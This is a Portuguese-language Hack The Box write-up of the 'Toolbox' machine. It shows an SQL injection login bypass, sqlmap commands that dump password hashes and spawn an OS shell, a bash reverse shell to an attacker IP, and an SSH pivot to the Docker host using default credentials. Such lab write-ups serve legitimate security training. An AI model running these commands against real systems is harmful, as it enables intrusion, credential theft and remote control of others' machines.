Enumeração de serviços:
![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304215048.png]]
Identificação do executavel docker-toolbox.exe no FTP, indicando que temos uma aplicação rodando em container:
![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304215222.png]]
Durante enumeração com nmap, identificamos o subdomínio admin.megalogistic.com, adicionamos em `/etc/hosts` e acessamos para verificar o conteúdo:
![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304221211.png]]
Ao tentara um payload de SQLi, recebemos um erro:
![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304221257.png]]
E ao utlizar o payload `admin' OR '1'='1` no nome do usuário, conseguimos dar um bypass na tela de login:
![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304222026.png]]
Utilizando o utilitário `sqlmap` vamos enumerar o alvo com o comando:
``` bash
# Enumeração do tipo de banco
sudo sqlmap -u https://admin.megalogistic.com/index.php --data "username=admin&password=123" -p username --dbs
```
Após algumas enumerações, extraimos o hash do admin com o comando:
```bash
sudo sqlmap -u https://admin.megalogistic.com/index.php --data "username=admin&password=123" -p username -D public -T users -C password,username --dump
```
Conseguimos uma shell com o comando:
```bash
sudo sqlmap -u https://admin.megalogistic.com/index.php --data "username=1&password=admin" -p username --flush-session --time-sec=20 --os-shell
```
E enviamos uma shell reversa com o comando:
```bash
/bin/bash -c 'bash -i > /dev/tcp/10.10.14.9/1234 0>&1'
```
![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304230749.png]]
Ao verificar a versão do Linux, descobrimos que se trata de uma imagem específica para utilização em container:
![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304233304.png]]
E ao pesquisar um pouco na internet, descobrimos algumas falhas de configuração, como a conexão com a máquina host através do ssh com o seguinte login:
```bash
# Login no host
ssh docker@172.17.0.1
# Password: tcuser
```

![[Write-up/Hack The Box/Toolbox/img/Pasted image 20240304233447.png]]
A flag pode ser encontrada na pasta `/c` na raiz do host.